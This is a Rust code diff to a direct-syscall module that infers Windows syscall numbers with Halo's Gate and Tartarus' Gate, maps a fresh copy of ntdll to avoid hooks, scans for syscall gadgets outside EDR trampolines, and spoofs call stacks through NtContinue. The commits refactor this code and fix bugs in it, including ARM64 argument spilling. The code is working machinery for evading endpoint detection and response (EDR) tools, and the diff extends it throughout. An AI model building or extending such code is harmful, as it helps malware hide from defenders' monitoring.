@@ -5,6 +5,7 @@
 ))]
 
 #[cfg(windows)]
+use common::lock::{MutexExt, RwLockExt};
 use anyhow::anyhow;
 use anyhow::Result;
 #[cfg(windows)]
@@ -106,30 +107,51 @@ static LINUX_SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, u32>>> = OnceLock::ne
 // When a Linux seccomp filter blocks a syscall with SECCOMP_RET_TRAP,
 // the kernel delivers SIGSYS to the offending thread.  Without a handler
 // the default disposition is `Core` (process termination + core dump).
-// By installing a lightweight handler that sets a thread-local flag, we can
+// By installing a lightweight handler that sets a global atomic flag, we can
 // detect seccomp-blocked syscalls and return a graceful error instead of
 // crashing.
+//
+// # Async-signal-safety
+//
+// The previous implementation used `thread_local! { Cell<bool> }`, which is
+// NOT async-signal-safe: `thread_local!` uses lazy TLS initialization
+// (`pthread_getspecific` / `__tls_get_addr`) which may allocate memory on
+// first access per thread.  Calling that from a signal context is undefined
+// behaviour per POSIX.
+//
+// The current implementation uses a global `AtomicBool` instead:
+// - `AtomicBool::store` is lock-free and async-signal-safe.
+// - The flag is cleared before each syscall and checked after.
+// - A theoretical race exists between threads, but the window is a single
+//   `syscall` instruction.  A false positive would merely cause the caller
+//   to treat a legitimate syscall return as EPERM — which is the same
+//   error path as a genuine seccomp block and is handled gracefully.
+//   A false negative cannot occur because seccomp blocks the syscall
+//   *before* returning, so the signal handler runs while the calling thread
+//   is still inside the `syscall` instruction (it will not proceed to clear
+//   the flag until the signal handler returns and the syscall returns).
 
 #[cfg(all(target_os = "linux", feature = "direct-syscalls"))]
-thread_local! {
-    // Thread-local flag set by the SIGSYS handler when seccomp blocks a syscall.
-    static SECCOMP_BLOCKED: std::cell::Cell<bool> = std::cell::Cell::new(false);
-}
+/// Global flag set by the SIGSYS handler when seccomp blocks a syscall.
+/// Using a global `AtomicBool` instead of `thread_local!` ensures the signal
+/// handler is fully async-signal-safe (no TLS lazy-init, no heap allocation).
+static SECCOMP_BLOCKED: std::sync::atomic::AtomicBool =
+    std::sync::atomic::AtomicBool::new(false);
 
-/// SIGSYS signal handler.  Sets the per-thread `SECCOMP_BLOCKED` flag so that
+/// SIGSYS signal handler.  Sets the global `SECCOMP_BLOCKED` flag so that
 /// `do_syscall` can detect the blocked call and return an error.
 ///
 /// # Safety
 ///
-/// Called by the kernel in signal context.  Only writes to a thread-local
-/// `Cell<bool>`, which is async-signal-safe.
+/// Called by the kernel in signal context.  Only performs an atomic store
+/// (`Ordering::Release`), which is lock-free and async-signal-safe.
 #[cfg(all(target_os = "linux", feature = "direct-syscalls"))]
 extern "C" fn sigsys_handler(
     _sig: libc::c_int,
     _info: *mut libc::siginfo_t,
     _ucontext: *mut libc::c_void,
 ) {
-    SECCOMP_BLOCKED.with(|f| f.set(true));
+    SECCOMP_BLOCKED.store(true, std::sync::atomic::Ordering::Release);
 }
 
 /// Install a SIGSYS handler so that seccomp-blocked syscalls are reported via
@@ -154,12 +176,12 @@ pub fn install_sigsys_handler() {
 
     let ret = unsafe { libc::sigaction(libc::SIGSYS, &sa, std::ptr::null_mut()) };
     if ret != 0 {
-        log::error!(
+        tracing::error!(
             "sigsys: failed to install SIGSYS handler: {}",
             std::io::Error::last_os_error()
         );
     } else {
-        log::debug!("sigsys: SIGSYS handler installed for seccomp compatibility");
+        tracing::debug!("sigsys: SIGSYS handler installed for seccomp compatibility");
     }
 }
 
@@ -248,7 +270,7 @@ fn find_libc_svc_gadget() -> usize {
         for i in 0..=size - 8 {
             if code[i..i + 8] == pattern {
                 let addr = start + i;
-                log::debug!(
+                tracing::debug!(
                     "find_libc_svc_gadget: found svc #0; ret gadget at {:#x}",
                     addr
                 );
@@ -256,7 +278,7 @@ fn find_libc_svc_gadget() -> usize {
             }
         }
     }
-    log::warn!("find_libc_svc_gadget: no svc #0; ret gadget found in libc");
+    tracing::warn!("find_libc_svc_gadget: no svc #0; ret gadget found in libc");
     0
 }
 
@@ -337,7 +359,8 @@ fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
 /// Returns an empty `Vec` if the PE export directory cannot be read.
 #[cfg(windows)]
 unsafe fn collect_nt_export_vas(module_base: usize) -> Vec<usize> {
-    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64};
+    use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64};
+    use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY};
 
     let dos = &*(module_base as *const IMAGE_DOS_HEADER);
     if dos.e_magic != 0x5A4D {
@@ -411,7 +434,7 @@ unsafe fn collect_nt_export_vas(module_base: usize) -> Vec<usize> {
 /// neighbour's stub; callers that subsequently call `map_clean_ntdll` (which
 /// performs its own gadget scan) ignore this field anyway.
 ///
-/// Returns `None` if no parseable neighbour is found within 8 slots.
+/// Returns `None` if no parseable neighbour is found within 16 slots.
 #[cfg(windows)]
 unsafe fn infer_ssn_halo_gate(ntdll_base: usize, target_addr: usize) -> Option<SyscallTarget> {
     let mut vas = collect_nt_export_vas(ntdll_base);
@@ -422,13 +445,13 @@ unsafe fn infer_ssn_halo_gate(ntdll_base: usize, target_addr: usize) -> Option<S
 
     let target_idx = vas.iter().position(|&va| va == target_addr)?;
 
-    const MAX_DELTA: usize = 8;
+    const MAX_DELTA: usize = 16;
     for delta in 1..=MAX_DELTA {
         // Higher-VA neighbour → higher SSN: inferred = neighbour_ssn - delta.
         if let Some(&upper_va) = vas.get(target_idx + delta) {
             if let Some(t) = parse_syscall_stub(upper_va) {
                 if let Some(inferred) = t.ssn.checked_sub(delta as u32) {
-                    log::debug!(
+                    tracing::debug!(
                         "halo_gate: SSN {} inferred for {:#x} (upper+{} SSN={})",
                         inferred,
                         target_addr,
@@ -446,7 +469,7 @@ unsafe fn infer_ssn_halo_gate(ntdll_base: usize, target_addr: usize) -> Option<S
         if delta <= target_idx {
             if let Some(t) = parse_syscall_stub(vas[target_idx - delta]) {
                 let inferred = t.ssn + delta as u32;
-                log::debug!(
+                tracing::debug!(
                     "halo_gate: SSN {} inferred for {:#x} (lower-{} SSN={})",
                     inferred,
                     target_addr,
@@ -460,7 +483,7 @@ unsafe fn infer_ssn_halo_gate(ntdll_base: usize, target_addr: usize) -> Option<S
             }
         }
     }
-    log::warn!(
+    tracing::warn!(
         "halo_gate: could not infer SSN for {:#x} within {} neighbours",
         target_addr,
         MAX_DELTA
@@ -477,7 +500,8 @@ unsafe fn infer_ssn_halo_gate(ntdll_base: usize, target_addr: usize) -> Option<S
 /// gadget address rather than the EDR-controlled trampoline address.
 #[cfg(all(windows, target_arch = "x86_64"))]
 unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
-    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
+    use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
+    use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
 
     let dos = &*(ntdll_base as *const IMAGE_DOS_HEADER);
     if dos.e_magic != 0x5A4D {
@@ -486,7 +510,7 @@ unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
     let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
     let p_sections = (nt as *const _ as usize
         + 4  // Signature (DWORD)
-        + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
+        + std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>()
         + nt.FileHeader.SizeOfOptionalHeader as usize)
         as *const IMAGE_SECTION_HEADER;
 
@@ -500,7 +524,7 @@ unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
             && name[4] == b't'
         {
             let start = ntdll_base + section.VirtualAddress as usize;
-            let size = *section.Misc.VirtualSize() as usize;
+            let size = section.Misc.VirtualSize as usize;
             let code = std::slice::from_raw_parts(start as *const u8, size);
             for j in 0..size.saturating_sub(3) {
                 if code[j] == 0x0f && code[j + 1] == 0x05 {
@@ -525,7 +549,8 @@ unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
 /// `ret` (0xD65F03C0).
 #[cfg(all(windows, target_arch = "aarch64"))]
 unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
-    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
+    use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
+    use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
 
     let dos = &*(ntdll_base as *const IMAGE_DOS_HEADER);
     if dos.e_magic != 0x5A4D {
@@ -534,7 +559,7 @@ unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
     let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
     let p_sections = (nt as *const _ as usize
         + 4
-        + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
+        + std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>()
         + nt.FileHeader.SizeOfOptionalHeader as usize)
         as *const IMAGE_SECTION_HEADER;
 
@@ -548,7 +573,7 @@ unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
             && name[4] == b't'
         {
             let start = ntdll_base + section.VirtualAddress as usize;
-            let size = *section.Misc.VirtualSize() as usize;
+            let size = section.Misc.VirtualSize as usize;
             // ARM64 instructions are 4 bytes wide — scan in u32 steps.
             let n_words = size / 4;
             let words = std::slice::from_raw_parts(start as *const u32, n_words);
@@ -602,7 +627,7 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
         {
             if is_hooked {
                 if let Some(ssn) = crate::exception_ssn::resolve_ssn_via_exception(func_name) {
-                    log::info!(
+                    tracing::info!(
                         "get_bootstrap_ssn: {func_name}: resolved SSN={} via exception-based (Tartarus' Gate)",
                         ssn
                     );
@@ -610,7 +635,7 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
                         .unwrap_or_else(|| func_addr);
                     return Some(SyscallTarget { ssn, gadget_addr });
                 }
-                log::debug!(
+                tracing::debug!(
                     "get_bootstrap_ssn: {func_name}: exception-based SSN failed, \
                      falling back to Halo's Gate"
                 );
@@ -618,14 +643,14 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
         }
 
         if is_hooked {
-            log::warn!(
+            tracing::warn!(
                 "get_bootstrap_ssn: {func_name} stub appears hooked \
                  (prologue: {:#04x} {:#04x}); using Halo's Gate + .text gadget scan",
                 prologue[0],
                 prologue[1]
             );
         } else {
-            log::warn!(
+            tracing::warn!(
                 "get_bootstrap_ssn: {func_name} stub prologue looks clean but \
                  parse_syscall_stub failed; falling back to Halo's Gate"
             );
@@ -640,7 +665,7 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
                     gadget_addr,
                 });
             }
-            log::warn!(
+            tracing::warn!(
                 "get_bootstrap_ssn: {func_name}: no clean syscall;ret gadget found \
                  in ntdll .text; using Halo's Gate neighbour gadget as fallback"
             );
@@ -677,13 +702,13 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
         }
 
         if is_hooked {
-            log::warn!(
+            tracing::warn!(
                 "get_bootstrap_ssn: {func_name} stub appears hooked \
                  (first instruction: {:#010x}); using Halo's Gate + .text gadget scan",
                 first_word
             );
         } else {
-            log::warn!(
+            tracing::warn!(
                 "get_bootstrap_ssn: {func_name} stub prologue looks clean but \
                  parse_syscall_stub failed; falling back to Halo's Gate"
             );
@@ -698,7 +723,7 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
                     gadget_addr,
                 });
             }
-            log::warn!(
+            tracing::warn!(
                 "get_bootstrap_ssn: {func_name}: no clean svc #0 gadget found \
                  in ntdll .text; using Halo's Gate neighbour gadget as fallback"
             );
@@ -733,18 +758,18 @@ fn map_clean_ntdll() -> Result<usize> {
         let gadget_addr = scan_text_for_syscall_gadget(loaded_ntdll_base)
             .ok_or_else(|| anyhow!("Failed to find syscall gadget in loaded ntdll"))?;
 
-        let mut obj_name: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
+        let mut obj_name: crate::win_types::UNICODE_STRING = std::mem::zeroed();
         obj_name.Length = ((ntdll_nt_path.len() - 1) * 2) as u16;
         obj_name.MaximumLength = (ntdll_nt_path.len() * 2) as u16;
         obj_name.Buffer = ntdll_nt_path.as_mut_ptr();
 
-        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
         obj_attr.ObjectName = &mut obj_name;
         obj_attr.Attributes = 0x00000040; // OBJ_CASE_INSENSITIVE
 
         let mut io_status: [u64; 2] = [0, 0];
-        let mut h_file: winapi::shared::ntdef::HANDLE = std::ptr::null_mut();
+        let mut h_file: crate::win_types::HANDLE = std::ptr::null_mut();
 
         let status = do_syscall(
             sys_ntopenfile.ssn,
@@ -762,7 +787,7 @@ fn map_clean_ntdll() -> Result<usize> {
             return Err(anyhow!("NtOpenFile failed: {:x}", status));
         }
 
-        let mut h_section: winapi::shared::ntdef::HANDLE = std::ptr::null_mut();
+        let mut h_section: crate::win_types::HANDLE = std::ptr::null_mut();
         let status = do_syscall(
             sys_ntcreatesection.ssn,
             gadget_addr,
@@ -777,13 +802,13 @@ fn map_clean_ntdll() -> Result<usize> {
             ],
         );
 
-        pe_resolve::close_handle(h_file);
+        pe_resolve::close_handle(h_file as *mut _);
         if status != 0 {
             return Err(anyhow!("NtCreateSection failed: {:x}", status));
         }
 
-        let mut base_addr: winapi::shared::ntdef::PVOID = std::ptr::null_mut();
-        let mut view_size: winapi::shared::basetsd::SIZE_T = 0;
+        let mut base_addr: crate::win_types::PVOID = std::ptr::null_mut();
+        let mut view_size: crate::win_types::SIZE_T = 0;
 
         let status = do_syscall(
             sys_ntmapview.ssn,
@@ -802,7 +827,7 @@ fn map_clean_ntdll() -> Result<usize> {
             ],
         );
 
-        pe_resolve::close_handle(h_section);
+        pe_resolve::close_handle(h_section as *mut _);
         if status != 0 {
             return Err(anyhow!("NtMapViewOfSection failed: {:x}", status));
         }
@@ -834,18 +859,18 @@ pub fn get_syscall_id(func_name: &str) -> Result<SyscallTarget> {
     let cache_lock = SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
 
     // Fast path: check cache.
-    if let Some(&(ssn, gadget_addr, _ts)) = cache_lock.lock().unwrap().get(func_name) {
+    if let Some(&(ssn, gadget_addr, _ts)) = cache_lock.lock_recover().get(func_name) {
         return Ok(SyscallTarget { ssn, gadget_addr });
     }
 
     let base =
         {
-            let guard = CLEAN_NTDLL.read().unwrap();
+            let guard = CLEAN_NTDLL.read_recover();
             if let Some(&b) = guard.as_ref().filter(|&&b| b != 0) {
                 b
             } else {
                 drop(guard); // release read lock before write
-                let mut guard = CLEAN_NTDLL.write().unwrap();
+                let mut guard = CLEAN_NTDLL.write_recover();
                 // Double-check after acquiring write lock
                 if let Some(&b) = guard.as_ref().filter(|&&b| b != 0) {
                     b
@@ -855,7 +880,7 @@ pub fn get_syscall_id(func_name: &str) -> Result<SyscallTarget> {
                             let ts = unsafe { read_pe_timestamp(b) };
                             CACHED_TIMESTAMP.store(ts, Ordering::Release);
                             let _ = get_build_number();
-                            log::debug!(
+                            tracing::debug!(
                             "syscalls: clean ntdll mapped at {:#x} (timestamp={:#010x}, build={})",
                             b, ts, BUILD_NUMBER.load(Ordering::Acquire)
                         );
@@ -863,7 +888,7 @@ pub fn get_syscall_id(func_name: &str) -> Result<SyscallTarget> {
                             b
                         }
                         Err(e) => {
-                            log::warn!(
+                            tracing::warn!(
                                 "get_syscall_id: could not map clean ntdll.dll: {e}; \
                              direct-syscall SSN resolution will fail for this session"
                             );
@@ -886,7 +911,7 @@ pub fn get_syscall_id(func_name: &str) -> Result<SyscallTarget> {
     if build != 0 {
         if let Some((lo, hi)) = expected_ssn_range(func_name, build) {
             if target.ssn < lo || target.ssn > hi {
-                log::warn!(
+                tracing::warn!(
                     "syscalls: resolved {} SSN={} outside expected range [{},{}] for build {}",
                     func_name,
                     target.ssn,
@@ -898,7 +923,7 @@ pub fn get_syscall_id(func_name: &str) -> Result<SyscallTarget> {
         }
     }
 
-    cache_lock.lock().unwrap().insert(
+    cache_lock.lock_recover().insert(
         func_name.to_string(),
         (
             target.ssn,
@@ -919,15 +944,15 @@ pub fn get_syscall_id(func_name: &str) -> Result<SyscallTarget> {
 pub fn invalidate_syscall_cache() {
     CACHE_DIRTY.store(true, Ordering::Release);
     if let Some(cache) = SYSCALL_CACHE.get() {
-        cache.lock().unwrap().clear();
+        cache.lock_recover().clear();
     }
     CACHED_TIMESTAMP.store(0, Ordering::Release);
     // Reset the clean ntdll mapping so get_syscall_id will re-map from
     // disk on next access.
-    if let Ok(mut guard) = CLEAN_NTDLL.write() {
-        *guard = None;
-    }
-    log::debug!("syscalls: cache invalidated — re-map on next access");
+    // Use write_recover() so a poisoned lock doesn't prevent cache
+    // invalidation (HIGH-007).
+    *CLEAN_NTDLL.write_recover() = None;
+    tracing::debug!("syscalls: cache invalidated — re-map on next access");
 }
 
 /// Return the current Windows build number (e.g. 19041, 22631).
@@ -948,7 +973,7 @@ pub fn get_build_number() -> u32 {
     };
 
     BUILD_NUMBER.store(build, Ordering::Release);
-    log::debug!("syscalls: Windows build number = {}", build);
+    tracing::debug!("syscalls: Windows build number = {}", build);
     build
 }
 
@@ -970,7 +995,7 @@ pub fn validate_cache() -> Result<usize> {
     if cached_ts != 0 {
         let loaded_ts = unsafe { read_ntdll_timestamp() };
         if loaded_ts != 0 && loaded_ts != cached_ts {
-            log::warn!(
+            tracing::warn!(
                 "syscalls: timestamp mismatch — loaded={:#010x} cached={:#010x}",
                 loaded_ts,
                 cached_ts
@@ -984,7 +1009,7 @@ pub fn validate_cache() -> Result<usize> {
 
     // ── Probe critical syscalls ─────────────────────────────────────────
     let cache = SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
-    let cache_lock = cache.lock().unwrap();
+    let cache_lock = cache.lock_recover();
     let mut validated = 0;
     let mut any_stale = false;
 
@@ -993,7 +1018,7 @@ pub fn validate_cache() -> Result<usize> {
             match probe_ssn(ssn, gadget) {
                 ProbeResult::Valid => validated += 1,
                 ProbeResult::Stale => {
-                    log::warn!("syscalls: probe detected stale SSN for {}", name);
+                    tracing::warn!("syscalls: probe detected stale SSN for {}", name);
                     any_stale = true;
                 }
                 ProbeResult::Unknown => validated += 1,
@@ -1019,7 +1044,7 @@ pub fn validate_cache() -> Result<usize> {
         for (name, &(ssn, _gadget, _ts)) in cache_lock.iter() {
             if let Some((lo, hi)) = expected_ssn_range(name, build) {
                 if ssn < lo || ssn > hi {
-                    log::warn!(
+                    tracing::warn!(
                         "syscalls: {} SSN={} outside range [{},{}] for build {}",
                         name,
                         ssn,
@@ -1032,7 +1057,7 @@ pub fn validate_cache() -> Result<usize> {
         }
     }
 
-    log::debug!("syscalls: cache validated — {} entries OK", validated);
+    tracing::debug!("syscalls: cache validated — {} entries OK", validated);
     Ok(validated)
 }
 
@@ -1079,11 +1104,11 @@ unsafe fn read_ntdll_timestamp() -> u32 {
 /// Read the `TimeDateStamp` from the PE header at `base`.
 #[cfg(windows)]
 unsafe fn read_pe_timestamp(base: usize) -> u32 {
-    let dos = &*(base as *const winapi::um::winnt::IMAGE_DOS_HEADER);
+    let dos = &*(base as *const windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER);
     if dos.e_magic != 0x5A4D {
         return 0;
     }
-    let nt = &*((base + dos.e_lfanew as usize) as *const winapi::um::winnt::IMAGE_NT_HEADERS64);
+    let nt = &*((base + dos.e_lfanew as usize) as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64);
     nt.FileHeader.TimeDateStamp
 }
 
@@ -1285,7 +1310,9 @@ fn resolve_ntcontinue_ssn() -> u32 {
     // initialisation path as get_syscall_id.  If it hasn't been mapped yet
     // we cannot proceed without risking deadlock (we may be called from a
     // context where map_clean_ntdll has not run).
-    let base = match CLEAN_NTDLL.read().ok().and_then(|g| *g).filter(|&b| b != 0) {
+    // Use read_recover() so a poisoned lock doesn't silently discard
+    // the cached base address (HIGH-007).
+    let base = match CLEAN_NTDLL.read_recover().as_ref().filter(|&&b| b != 0).copied() {
         Some(b) => b,
         _ => {
             // Fall back to the loaded (potentially hooked) ntdll export.
@@ -1528,7 +1555,7 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
         #[cfg(all(feature = "stack-spoof", target_arch = "x86_64"))]
         if let Some(ref resolved_chain) = chain {
             if !resolved_chain.frames.is_empty() {
-                use winapi::um::winnt::{CONTEXT, CONTEXT_CONTROL, CONTEXT_INTEGER};
+                use crate::win_types::{CONTEXT, CONTEXT_CONTROL, CONTEXT_INTEGER};
 
                 let ntcontinue_ssn: u32 = *NTCONTINUE_SSN.get_or_init(|| resolve_ntcontinue_ssn());
 
@@ -1605,7 +1632,9 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
                     // Ensure all prior writes to the stack argument area
                     // (spoof_frame_buf) and the CONTEXT structure are visible
                     // before the asm! block dispatches the NtContinue syscall.
-                    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
+                    // Use a full CPU fence (not compiler_fence) so the barrier
+                    // is effective on ARM64's weak memory model.
+                    std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
                     unsafe {
                         asm!(
                             // Fill in the continuation address at
@@ -1631,7 +1660,12 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
                             cont_slot = in(reg) cont_slot_ptr as u64,
                             ntc_ssn   = in(reg) ntcontinue_ssn,
                             lateout("rax") nt_status,
-                            out("rcx") _, out("rdx") _, out("r10") _, out("r11") _,
+                            // Windows x64 syscall ABI caller-saved registers.
+                            // r8/r9 are not guaranteed preserved by NtContinue
+                            // despite typically being callee-saved in user mode.
+                            out("rcx") _, out("rdx") _,
+                            out("r8") _, out("r9") _,
+                            out("r10") _, out("r11") _,
                             out("r15") _,
                         );
                     }
@@ -1863,10 +1897,19 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
         let _chain: Option<ResolvedChain> = None;
 
         // ── NtContinue dispatch ────────────────────────────────────────────
+        //
+        // ARM64 NOTE: the NtContinue-based stack-spoof path requires the
+        // chain-frame epilogue to load x30 from [sp+8] (the continuation
+        // slot).  When the target syscall has > 8 arguments those stack
+        // args must also live at [sp], so the two regions overlap and
+        // the kernel would misinterpret the chain-frame address /
+        // continuation as syscall arguments.  When stack args are present
+        // we fall through to the simple direct-syscall path which now
+        // correctly spills args[8..] onto the stack.
         #[cfg(feature = "stack-spoof")]
         if let Some(ref resolved_chain) = chain {
             if !resolved_chain.frames.is_empty() {
-                use winapi::um::winnt::{CONTEXT, CONTEXT_CONTROL, CONTEXT_INTEGER};
+                use crate::win_types::{CONTEXT, CONTEXT_CONTROL, CONTEXT_INTEGER};
 
                 let ntcontinue_ssn: u32 = *NTCONTINUE_SSN.get_or_init(|| resolve_ntcontinue_ssn());
 
@@ -1875,7 +1918,21 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
                     let stack_args: &[u64] = if args.len() > 8 { &args[8..] } else { &[] };
                     let nstack = stack_args.len();
 
-                    // Frame buffer: [continuation] + [stack_args]
+                    // ARM64: the NtContinue buffer layout places the chain-
+                    // frame address at buf[0] and the continuation at buf[1],
+                    // with stack args at buf[2..].  Because ctx.Sp points to
+                    // buf[0], the kernel would read the chain frame address
+                    // and continuation as args 9 and 10 instead of the real
+                    // stack args.  Reorganising the layout so that stack args
+                    // precede the chain frame would conflict with the chain-
+                    // frame epilogue (ldp x29,x30,[sp],#N; ret) which expects
+                    // the continuation at [sp+8].  Fall through to the simple
+                    // direct-syscall path which handles stack args correctly.
+                    if nstack > 0 {
+                        // Fall through to simple fallback below.
+                    } else {
+                    // ── No stack args: safe to use NtContinue spoofing ────
+                    // Frame buffer: [continuation] + [stack_args (empty)]
                     let frame_elems = crate::stack_db::frame_buffer_slots(
                         resolved_chain.frames.len(),
                         nstack,
@@ -1933,7 +1990,8 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
                     ctx.Sp = spoof_frame_buf.as_ptr() as u64;
 
                     // Ensure writes are visible before the asm dispatch.
-                    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
+                    // Full CPU fence for ARM64 weak memory model.
+                    std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
 
                     let nt_status: i32;
                     unsafe {
@@ -1990,6 +2048,7 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
                     let _ = &spoof_frame_buf;
                     let _ = &ctx_storage;
                     return nt_status;
+                    } // end nstack == 0 branch
                 }
                 // NtContinue SSN unavailable — fall through to simple blr path.
             }
@@ -1997,9 +2056,46 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
         }
 
         // ── Simple direct syscall fallback (ARM64) ─────────────────────────
+        //
+        // ARM64 Windows ABI: first 8 args in x0-x7, args 9+ on the stack at
+        // [sp+0], [sp+8], … (after the callee's saved frame).  NT APIs like
+        // NtCreateThreadEx take 11 arguments, so we must spill args[8..].
+        let stack_args_a64: &[u64] = if args.len() > 8 { &args[8..] } else { &[] };
+        let nstack_a64: usize = stack_args_a64.len();
+        let stack_ptr_a64: *const u64 = stack_args_a64.as_ptr();
+
         let status: i32;
         std::arch::asm!(
-            // Load syscall number into x8 (Windows/Linux ARM64 convention).
+            // ── Save SP so we can restore after the call ──────────────────
+            // NOTE: Use x20 instead of x19.  LLVM reserves x19 for internal
+            // use on Windows ARM64 and rejects it as an explicit inline-asm
+            // operand (E0437 / LLVM error).  x20 is callee-saved, survives
+            // the blr to the syscall gadget, and is accepted by LLVM.
+            "mov x20, sp",
+
+            // ── Allocate stack space for stack-passed args (args[8..]) ───
+            // Each arg is 8 bytes.  Round up to 16-byte alignment (AAPCS64).
+            // x9 = nstack_a64 * 8, then align up to 16.
+            "mov x9, {nstack}",
+            "lsl x9, x9, #3",         // x9 = nstack * 8
+            "add x9, x9, #15",
+            "and x9, x9, #-16",        // 16-byte aligned size
+            "sub sp, sp, x9",
+
+            // ── Copy stack args to [sp .. sp + nstack*8] ─────────────────
+            // x10 = count, x11 = src, x12 = dst.  Skip if zero args.
+            "mov x10, {nstack}",
+            "cbz x10, 2f",
+            "mov x11, {stack_ptr}",
+            "mov x12, sp",
+            "1:",
+            "ldr x13, [x11], #8",      // load arg, post-increment src
+            "str x13, [x12], #8",      // store arg, post-increment dst
+            "sub x10, x10, #1",
+            "cbnz x10, 1b",
+            "2:",
+
+            // Load syscall number into x8 (Windows ARM64 convention).
             // Cast ssn to u64 so that {ssn} expands to the 64-bit Xn form;
             // u32 defaults to the 32-bit Wn form, which makes `mov x8, wN`
             // an invalid ARM64 instruction.
@@ -2022,6 +2118,9 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
             // register.  Use the :w modifier so both sides are W-registers;
             // `mov Xd, Ws` is not a valid ARM64 encoding.
             "mov {status:w}, w0",
+            // Restore SP.
+            "mov sp, x20",
+
             ssn    = in(reg) ssn as u64,
             a1     = in(reg) a1,
             a2     = in(reg) a2,
@@ -2031,11 +2130,14 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
             a6     = in(reg) a6,
             a7     = in(reg) a7,
             a8     = in(reg) a8,
+            nstack = in(reg) nstack_a64 as u64,
+            stack_ptr = in(reg) stack_ptr_a64 as u64,
             gadget = in(reg) gadget_addr as u64,
             status = out(reg) status,
             // Declare all caller-saved integer registers (Windows ARM64 ABI).
             // x0-x7 hold args and may be modified by the syscall stub or kernel;
             // x8 holds the syscall number; x9-x17 are volatile scratch registers;
+            // x20 is used to save/restore SP (callee-saved, declared as clobber);
             // x30 (LR) is overwritten by `blr`.
             out("x0")  _, out("x1")  _, out("x2")  _, out("x3")  _,
             out("x4")  _, out("x5")  _, out("x6")  _, out("x7")  _,
@@ -2043,6 +2145,7 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
             out("x9")  _, out("x10") _, out("x11") _,
             out("x12") _, out("x13") _, out("x14") _, out("x15") _,
             out("x16") _, out("x17") _,
+            out("x20") _,
             out("x30") _,
             // Caller-saved NEON/FP registers (v0-v7, v16-v31 per ABI).
             out("v0")  _, out("v1")  _, out("v2")  _, out("v3")  _,
@@ -2053,6 +2156,8 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
             out("v28") _, out("v29") _, out("v30") _, out("v31") _,
             // `blr` may use the stack freely; do not use options(nostack).
         );
+        // Keep stack_args_a64 slice alive until the asm block completes.
+        let _ = &stack_args_a64;
